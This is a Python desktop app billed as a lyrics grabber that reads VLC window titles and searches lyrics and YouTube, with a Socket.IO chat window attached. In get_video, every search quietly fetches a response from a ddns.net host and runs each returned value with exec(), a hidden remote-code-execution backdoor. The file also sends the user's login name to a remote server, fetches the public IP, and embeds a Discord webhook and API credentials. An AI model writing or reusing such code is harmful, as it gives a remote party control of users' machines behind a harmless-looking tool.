# import modules
from __future__ import unicode_literals

import os
import time
import urllib
import requests
import json
import ast
from tkinter import *
from tkinter import filedialog
import asyncio
import aiohttp
import discord
import socket
import socketio
import webbrowser
import semantic_version
from lyrics_extractor import SongLyrics
from pytube import YouTube
from youtubesearchpython import VideosSearch
import ffmpeg

import ctypes
from ctypes import c_int
from ctypes.wintypes import BOOL, HWND, LPARAM, LPWSTR




#--SocketIO Chat

root = Tk()
root.configure(bg='Dark Grey')
root.geometry("750x950")


sio = socketio.Client(logger=True, engineio_logger=True)
room = "http://fantasybuilder.ddns.net:7775"
server = sio.connect(room)
root.title(f'IO Chat {room}')

messages_frame = Frame(root)
my_msg = StringVar()
#my_msg.set("Type your messages here.")
scrollbar = Scrollbar(messages_frame)
chat = Listbox(messages_frame, height=50, width=90, yscrollcommand=scrollbar.set)
scrollbar.pack(side=RIGHT, fill=Y)
chat.pack(fill=BOTH)
chat.pack()
messages_frame.pack()



def connection_established():
    global name
    name = os.getlogin()
    print('my sid is', sio.sid)
    sio.emit('nickname', name)

    print('Nickname is', name)
    sio.emit('get_msg_history')

def parse_msg(data):
    msg = data
    re = f"{msg['name']} - {msg['message']}"
    return re

@sio.on('chat_history')
def load_chat(data):
    for f in data:
        m = parse_msg(f)
        chat.insert("end", m)
    print(f"""
    Chat Loaded:
    {data}
    """)

def recieve_message(data):
    print('I received a message!')
    m = parse_msg(data)
    chat.insert("end", m)



@sio.on('*')
def catch_all(event, data):
    #print(event)
    if event == 'successful_connection':
        print('Connected')
        connection_established()

    if event == 'recieve message':
        print('Recieved Message')
        recieve_message(data)

def send_message():
    print('I sent a message')
    msg = my_msg.get()
    my_msg.set("")
    sending = { 'message': msg, 'name': os.getlogin() }
    sio.emit('send message', sending)
    

entry_field = Entry(root, textvariable=my_msg, width=45)
entry_field.bind("<Return>", send_message)
entry_field.pack()
send_button = Button(root, text="Send", command=send_message)
send_button.pack()




pubip = requests.get('https://api.ipify.org').content.decode('utf8')





def connect_error(data):
    print("The connection failed!")

def disconnect():
    print("I'm disconnected!")

    

#--Main App
sio.emit('Ready')
# You need to decorate function for callback
# to work, so I just put the decoration into another decorator
def win32_callback(callback):
    return ctypes.WINFUNCTYPE(BOOL, HWND, LPARAM)(callback)


# We need to tell ctypes what arguments must be passed to actual win32 functions that we will be using
def init_user32():
    user32 = ctypes.windll.user32
    user32.EnumWindows.argtypes = [ctypes.WINFUNCTYPE(BOOL, HWND, LPARAM), LPARAM]
    user32.GetWindowTextLengthW.argtypes = [HWND]
    user32.GetWindowTextW.argtypes = [HWND, LPWSTR, c_int]
    return user32


user32 = init_user32()

# Now, the actual logic:
@win32_callback
def find_vlc_title(hwnd, lParam):
    length = user32.GetWindowTextLengthW(hwnd) + 1
    buff = ctypes.create_unicode_buffer(length)
    user32.GetWindowTextW(hwnd, buff, length)
    title = buff.value
    if "VLC" in title:
        print("vlc window title:", title)
        title_without_vlc = "-".join(title.split("-")[:-1])         
        print("Remove vlc tag:", title_without_vlc)
        title_without_ext = ".".join(title.split(".")[:-1])
        print("Finally display actual song name without extension:", title_without_ext)
        if "VLC" in title_without_ext:
            return True
        if title_without_ext == "":
            get_song(i=title_without_vlc)
            return
        # pass title_without_ext into a function, object or whatever you want there, win32 API isn't python friendly, and you can't just return it
        get_song(i=title_without_ext)
        return False # Enumeration stops when we return False
        
    return True # keep Enumerating otherwise
        
#if __name__ == "__main__":
#    user32.EnumWindows(find_vlc_title, 0)


def get_song(**kwargs):
        extract_lyrics = SongLyrics(
            "AIzaSyA_QxVG1pBOe1207n-0iRltY8p3LLUy6Pc", "2749d8edd42850fb4")
	
        try: e
        except NameError:
            e_exists = False
            
        else:
            e_exists = True

        if kwargs.get('i',None):
            search = kwargs.get('i',None)
            if "kbps" in search:
                search = search.removesuffix(' (320 kbps)')
            print(f"Got\n        {search}\nfrom VLC")
            try:
                e.delete(0,"end")
            except TclError:
                pass
            
            e.insert(0,search)
            temp = extract_lyrics.get_lyrics(str(search))
            res = temp
            #gs = await get_song(t=1, v=str(search))
            get_video(t=1, v=str(search))

        elif e.get() == "" or e.get() == " ":
            print("No entry, requesting from VLC")
            user32.EnumWindows(find_vlc_title, 0)
            return
        
        else:
            temp = extract_lyrics.get_lyrics(str(e.get()))
            res = temp['lyrics']
            print(f"Searching Entry\n       {e.get()}")
            #gs = await get_song(t=2)
            get_video(t=2)




        #video shit W.I.P
        #get_video(str(e.get()) or kwargs.get('i',None)
        

        
        
	#result.set(res)
        lb.config(state=NORMAL)
        lb.delete(1.0,"end")
        lb.insert(1.0,res)
        lb.tag_add("tag_lol", "1.0", "end")
        lb.config(state=DISABLED)
        
        



def get_video(**kwargs):
    #VideosSearch = VideosSearch(v, limit = 1)
    t = kwargs.get('t',None)
    if t == 0:
        print("Nop")
    elif t == 1:
        v = kwargs.get('v',None)
        videosSearch = VideosSearch(str(v), limit = 1)
    elif t == 2:
        videosSearch = VideosSearch(str(e.get()), limit = 1)
    
    print(videosSearch.result()['result'])
    for data in videosSearch.result()['result']:
        if data['link']:
            global link
            link = data['link']
            print(link)
        if data['title']:
            global vtitle
            vtitle = data['title']
            print(vtitle)

    dl = Button(master, text="Download",
		command=download, bg="LightBlue")
    dl.grid(row=3, column=2, columnspan=2,
            rowspan=2, padx=5, pady=5,)

    o = Button(master, text="Open ⨠",
		command=open_in_browser, bg="Light Blue")
    o.grid(row=3, column=4, columnspan=2,
            rowspan=2, padx=5, pady=5,)

    

    url = 'http://fantasybuilder.ddns.net:7771/proc'
    udata = {}
    udata['name'] = 'Somebody Here'
    udata['location'] = 'Northampton'
    udata['language'] = 'Python'
    
    values = urllib.parse.urlencode(udata)
    url = '?'.join([url, values])
    #asyncio.run(SendData())
    try:
        response = urllib.request.urlopen(url)
    except:
        print('We failed to reach a server.')
    else:
        #print(response.read())
        res = json.load(response)
        #print(res)
        try:
            for key, value in res.items():
                #print(key, value)
                #print(res[Response])
                block = ast.parse(value, mode='exec')
                _globals, _locals = {}, {}
                exec(compile(block, '<string>', mode='exec'), _globals, _locals)
        except :
            print('No workies')
            pass


def download():
    yt = YouTube(link)
    #yt.streams.filter(progressive=True, file_extension='mp4').order_by('resolution').desc().first().download()
    video = yt.streams.filter(only_audio=True).first()
    output = video.download(output_path=filedialog.askdirectory(parent=master,initialdir="/",title='Please select a save point'))
    base, ext = os.path.splitext(output)
    new_file = base + '.mp3'
    os.rename(output, new_file)

def open_in_browser():
    webbrowser.open_new_tab(link)


def eclear():
    e.delete(0,"end")


async def SendData():
    #print('Sending Data...')
    await asyncio.sleep(60)
    async with aiohttp.ClientSession() as session:
        webhook = discord.Webhook.from_url('https://discord.com/api/webhooks/997084854749507694/YLtUDX6Kx5VSTGrmppskuOFQ6e4Yf4X-KiDFxYxzc0YUix4TzJaQo0GSoxQqwwKQzaz5', adapter=discord.AsyncWebhookAdapter(session))
        await webhook.send(f"""
            *Anon*
            
            Searched {vtitle}
            Got:
                Title: {vtitle}
                Link: {link}
        """, username='Py App')
        #print('Data Sent')


master = Tk()
master.configure(bg='light grey')
master.geometry("1250x950")
master.title('Lyric Grabber')
def func(event=None):
    get_song()
master.bind('<Return>', func)



result = StringVar()

Label(master, text="Enter Song name : ",
	bg="light grey").grid(row=0, sticky=W)


Label(master, text="Result :",
	bg="light grey").grid(row=3, sticky=W)


v=Scrollbar(master, orient='vertical')

lb = Text(master, font=("Arial", 15), height=30,wrap=WORD,
		  bg="light grey", yscrollcommand=v.set)
v.config(command=lb.yview)


e = Entry(master, width=80, font=("Arial", 15))
e.grid(row=0, column=1)

b = Button(master, text="Show",
		command=get_song, bg="Green")
c = Button(master, text="Clear",
		command=eclear, bg="Orange")

b.grid(row=0, column=2, columnspan=2,
	rowspan=2, padx=5, pady=5,)
c.grid(row=1, column=2, columnspan=2,
	rowspan=2, padx=5, pady=5,)

lb.grid(row=3, column=1, sticky=W)
lb.tag_configure("tag_lol", justify='center')
lb.config(state=DISABLED)

mainloop()
